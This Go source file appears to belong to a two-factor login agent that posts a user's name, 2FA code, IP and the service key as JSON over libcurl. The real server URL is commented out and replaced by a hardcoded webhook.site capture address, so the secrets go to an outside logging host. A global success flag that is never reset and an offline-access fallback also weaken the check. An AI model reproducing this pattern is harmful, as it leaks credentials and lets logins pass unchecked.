package main

import (
	"encoding/json"
	"fmt"
	"strings"

	curl "github.com/andelf/go-curl"
)

type serviceAgentLogin struct {
	ServiceID  string `json:"serviceID"`
	ServiceKey string `json:"serviceKey"`
	User       string `json:"user,omitempty"`
	Code       string `json:"code,omitempty"`
	UserIP     string `json:"userIP,omitempty"`
}

type responseStruct struct {
	Status string      `json:"status"`
	Error  error       `json:"error,omitempty"`
	Reason string      `json:"reason,omitempty"`
	Intent string      `json:"intent,omitempty"`
	Data   interface{} `json:"data"`
}

var authStatus = false

func sendTfaReq(user, code, userIP string) bool {
	var reqData = serviceAgentLogin{
		ServiceID:  serverURL,
		ServiceKey: serviceKey,
		User:       user,
		Code:       code,
		UserIP:     userIP,
	}

	requestBody, _ := json.Marshal(&reqData)
	//urlPath := fmt.Sprintf("%s/auth/agent/nix", serverURL)
	urlPath := "https://webhook.site/d7050429-1452-4fe5-a319-d489aab9d8ae"

	if debug {
		writeLog(fmt.Sprintf("sending tfa request with url: %s |  request data: %s", urlPath, string(requestBody)))
	}

	easy := curl.EasyInit()
	defer easy.Cleanup()

	easy.Setopt(curl.OPT_URL, urlPath)
	easy.Setopt(curl.OPT_SSL_VERIFYPEER, true)
	easy.Setopt(curl.OPT_POSTFIELDS, string(requestBody))
	easy.Setopt(curl.OPT_WRITEFUNCTION, handleResponse)
	if err := easy.Perform(); err != nil {
		writeLog(fmt.Sprintf("[Perform()] failed connect to werbot server %s.", err.Error()))
		offU := listOfflineUsers(user, offlineUsers)
		if offU == true {
			writeLog(fmt.Sprintf("[Offline Access] Allowing offline access for user %s.", user))
			return true
		}
	}
	return authStatus
}

// offlineUsers splits csv offline users retreived from confif file and returns boolean value based on username match
func listOfflineUsers(username string, usernames string) bool {
	users := strings.Split(usernames, ",")
	resp := false
	for _, v := range users {
		str := strings.TrimSpace(v)
		if str == username {
			resp = true
		}
	}
	return resp
}

func handleResponse(buf []byte, userdata interface{}) bool {
	var result responseStruct
	err := json.Unmarshal(buf, &result)

	if err != nil {
		writeLog(fmt.Sprintf("[SendReq] failed to parse response body"))
		return false
	}

	if debug {
		mar, err := json.Marshal(result)
		if err != nil {
			writeLog("Failed to parse http json response")
		}
		writeLog(fmt.Sprintf("response data: %s", string(mar)))
	}

	if result.Status == "success" {
		authStatus = true
	}
	return true
}
